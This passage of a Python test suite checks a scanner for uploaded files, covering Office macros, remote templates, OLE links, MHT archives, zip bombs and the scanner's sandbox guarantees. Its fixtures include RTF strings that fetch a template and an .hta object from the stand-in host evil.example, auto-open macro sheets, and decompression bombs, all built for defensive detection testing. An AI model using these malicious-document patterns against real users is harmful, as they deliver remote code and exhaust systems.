        assert "loads a remote object from evil.example" in text_of(f)

    def test_local_template_and_external_hyperlinks_are_fine(self):
        data = ooxml("word", {
            "word/_rels/settings.xml.rels": rels(("attachedTemplate", "file:///C:/Templates/Normal.dotm")),
            "word/_rels/document.xml.rels": rels(("hyperlink", "https://example.com/careers")),
        })
        assert finding("letter.docx", data, S8).status == "clear"

    def test_excel4_auto_open_sheet(self):
        workbook = b'<workbook><definedNames><definedName name="_xlnm.Auto_Open">Macro1!$A$1</definedName></definedNames></workbook>'
        data = ooxml("xl", {"xl/workbook.xml": workbook, "xl/macrosheets/sheet1.xml": b"<xm:macrosheet/>"})
        f = finding("report.xlsm", data, S8)
        assert f.status == "hit"
        assert "Excel 4.0 macro sheet" in text_of(f)

    def test_unreadable_macro_project(self):
        f = finding("invoice.docm", ooxml("word", {"word/vbaProject.bin": b"not a VBA project"}), S8)
        assert f.status == "unknown"
        assert "macro project that couldn't be read" in text_of(f)

    def test_password_protected_document(self):
        f = finding("invoice.docx", make_ole({"EncryptionInfo": bytes(4096), "EncryptedPackage": bytes(4096)}), S8)
        assert f.status == "unknown"
        assert "password-protected" in text_of(f)

    def test_damaged_ole(self):
        assert finding("x.doc", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + bytes(600), S8).status == "unknown"

    def test_bomb_inside_office_package(self):
        data = ooxml("word", {"word/media/big.bin": bytes(3 * 1024 * 1024)})
        f = finding("x.docx", data, S8)
        assert f.status == "unknown"
        assert "zip bomb" in text_of(f)

    def test_activemime_bomb_in_mht(self):
        # MHT ("single file web page") .doc files carry the VBA project as zlib-packed ActiveMime.
        active_mime = (b"ActiveMime" + bytes(0x14) + struct.pack("<H", 4)).ljust(0x32, b"\0")
        payload = active_mime + zlib.compress(bytes(65 * 1024 * 1024), 9)
        mht = (b'MIME-Version: 1.0\r\nContent-Type: multipart/related; boundary="b"\r\n\r\n--b\r\n'
               b"Content-Location: file:///C:/editdata.mso\r\nContent-Transfer-Encoding: base64\r\n"
               b"Content-Type: application/x-mso\r\n\r\n"
               + base64.encodebytes(payload) + b"\r\n--b--\r\n")
        assert detect_type(mht).label == "web archive (MHT)"
        f = finding("invoice.doc", mht, S8)
        assert f.status == "unknown"
        assert "zip bomb" in text_of(f)

    def test_plain_mht(self):
        mht = (b'MIME-Version: 1.0\r\nContent-Type: multipart/related; boundary="b"\r\n\r\n--b\r\n'
               b"Content-Type: text/html\r\n\r\n<html><body>Offer letter</body></html>\r\n--b--\r\n")
        assert text_of(finding("offer.doc", mht, S8)) == "offer.doc has no macros"

    def test_powerpoint_storage_inflate_is_capped(self):
        from oletools import olevba
        office._harden_oletools(olevba)
        bomb = zlib.compress(bytes(65 * 1024 * 1024), 9)
        with pytest.raises(office.InflateLimit):
            olevba.ppt_parser.iterative_decompress(io.BytesIO(bomb), len(bomb))
        small = zlib.compress(b"vba project")
        assert olevba.ppt_parser.iterative_decompress(io.BytesIO(small), len(small)) == (b"vba project", len(small), None)

    def test_rtf_remote_template(self):
        data = rb"{\rtf1{\*\template http://evil.example/t\'2edotm}Hello}"
        f = finding("cv.doc", data, S8)
        assert (f.status, text_of(f)) == ("hit", "cv.doc opens a remote template from evil.example when you open it")

    def test_rtf_ole2link(self):
        f = finding("cv.rtf", rtf_ole2link("http://evil.example/x.hta"), S8)
        assert f.status == "hit"
        assert "loads a remote object from evil.example" in text_of(f)

    def test_plain_rtf(self):
        assert finding("cv.rtf", rb"{\rtf1\ansi Hello {\b world}}", S8).status == "clear"

    @pytest.mark.parametrize("data", [TINY_PDF, png(), make_zip({"a.txt": b"x"}), b"Sub AutoOpen()\r\nEnd Sub\r\n"])
    def test_not_an_office_document(self, data):
        f = finding("file.bin", data, S8)
        assert (f.status, text_of(f)) == ("clear", "not an Office document")

    def test_msi_is_not_an_office_document(self):
        msi = make_ole({"x": bytes(4096)}, root_clsid=uuid.UUID("000C1084-0000-0000-C000-000000000046").bytes_le)
        assert text_of(finding("setup.msi", msi, S8)) == "not an Office document"


# ---------------------------------------------------------------- scan_file as a whole

FIXTURES = [
    ("report.pdf", pe()), ("report.pdf", TINY_PDF), ("logo.png", png()), ("x.zip", make_zip({"a.exe": pe()})),
    ("invoice.doc", word_doc(AUTO_OPEN)), ("invoice.docm", docm(AUTO_OPEN)), ("cv.iso", make_iso({"A.EXE": pe()})),
    ("x.cab", make_cab(["a.exe"])), ("cv.rtf", rtf_ole2link("http://evil.example/x")), ("x.gz", gzip.compress(pe())),
]


class TestScanFile:
    @pytest.mark.parametrize("name,data", FIXTURES)
    def test_one_finding_per_check_in_order(self, name, data):
        findings = scan_file(name, data)
        assert [f.check for f in findings] == [S7, S8, S9]
        assert all(f.check in load_table().checks for f in findings)

    @pytest.mark.parametrize("name,data", FIXTURES)
    def test_truncated_input_never_raises(self, name, data):
        for cut in (1, 7, 64, 600, len(data) // 2, len(data) - 1):
            findings = scan_file(name, data[:cut])
            assert [f.check for f in findings] == [S7, S8, S9]

    def test_unknown_says_why(self):
        for f in scan_file("x.rar", b"Rar!\x1a\x07\x00" + bytes(40)):
            if f.status == "unknown":
                assert f.evidence and f.evidence[0].summary.startswith("Couldn't check: ")

    def test_too_big(self):
        findings = scan_file("big.pdf", bytes(25 * 1024 * 1024 + 1))
        assert [f.status for f in findings] == ["unknown"] * 3

    def test_pure_no_network_subprocess_or_files(self, monkeypatch):
        for name, data in FIXTURES:  # let oletools finish its lazy imports first
            scan_file(name, data)
        calls = []

        def forbidden(what):
            def record(*args, **kwargs):
                calls.append(what)  # recorded, because the scanner swallows parser exceptions on purpose
                raise OSError(f"{what} is not allowed")
            return record

        monkeypatch.setattr(socket.socket, "connect", forbidden("socket.connect"))
        monkeypatch.setattr(subprocess.Popen, "__init__", forbidden("subprocess"))
        monkeypatch.setattr(builtins, "open", forbidden("open"))
        monkeypatch.setattr(io, "open", forbidden("io.open"))
        results = [scan_file(name, data) for name, data in FIXTURES]
        assert calls == []
        assert [f.status for f in results[0]] == ["hit", "clear", "clear"]
        assert [f.status for f in results[4]] == ["clear", "hit", "clear"]

    def test_attacker_bytes_are_never_opened_as_a_path(self, monkeypatch, tmp_path):
        # olefile reads bytes under 1536 long as a file name; oletools hands it attacker bytes.
        target = tmp_path / "planted.doc"
        target.write_bytes(word_doc())
        path = str(target).encode()
        name = b"Word.Document.8\0"
        ole1 = (struct.pack("<II", 0x0501, 2) + struct.pack("<I", len(name)) + name + struct.pack("<II", 0, 0)
                + struct.pack("<I", len(path)) + path)
        rtf = rb"{\rtf1{\object\objemb{\*\objdata " + ole1.hex().encode() + rb"}}}"
        docx = ooxml("word", {"word/embeddings/oleObject1.bin": b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + path})
        opened = []
        real_open = io.open

        def spy(file, *args, **kwargs):
            opened.append(file)
            return real_open(file, *args, **kwargs)

        monkeypatch.setattr(builtins, "open", spy)
        monkeypatch.setattr(io, "open", spy)
        scan_file("cv.rtf", rtf)
        scan_file("cv.docx", docx)
        assert opened == []


# ---------------------------------------------------------------- end to end with the rules engine

def pipeline_findings() -> list[Finding]:
    # The pipeline answers S4/S5/S10 for uploads (binary documents come back clear); scan_file only does S7-S9.
    return [Finding(check=c, status="clear") for c in ("S4_obfuscated_code", "S5_hidden_urls", "S10_runs_downloaded_code")]


def test_pe_named_pdf_is_red():
    verdict = decide(scan_file("report.pdf", pe()) + pipeline_findings(), {"file"})
    assert (verdict.color, verdict.reason) == ("red", "hard_trigger")
    assert verdict.fired[0].check == S7


def test_real_pdf_is_green():
    verdict = decide(scan_file("report.pdf", TINY_PDF) + pipeline_findings(), {"file"})
    assert (verdict.color, verdict.reason) == ("green", "no_flags")
    assert verdict.fired == []


# ---------------------------------------------------------------- end to end through the pipeline

def run_upload(name: str, data: bytes) -> dict:
    """The whole check for one uploaded file. Nothing here reaches the network or a model."""
    async def no_model(**_):
        raise RuntimeError("no model in tests")

    job = SimpleNamespace(id="test", emit=lambda *args, **kwargs: None)
    result = asyncio.run(run_check(job, Submission(), client=None, complete=no_model,
                                   upload=Upload(name=name, data=data)))
    return result["verdict"]


@pytest.mark.parametrize("name, data", [
    ("setup.exe", pe()), ("tool", ELF), ("app", MACHO_64), ("invite.lnk", LNK), ("data.bin", bytes(range(256)) * 4),
], ids=["windows", "linux", "mac", "shortcut", "unknown-type"])
def test_an_honestly_named_program_is_never_green(name, data):
    """Only running a program shows what it does. Until the decoy machine runs, that's yellow, not green."""
    verdict = run_upload(name, data)
    assert (verdict["color"], verdict["reason"]) == ("yellow", "low_coverage"), verdict
    assert set(verdict["unknown"]) == set(TEXT_CHECKS)  # every code check waits for the decoy machine


@pytest.mark.parametrize("name, data", [("report.pdf", TINY_PDF), ("photo.png", png())])
def test_a_real_document_through_the_pipeline_is_green(name, data):
    verdict = run_upload(name, data)
    assert (verdict["color"], verdict["reason"]) == ("green", "no_flags"), verdict
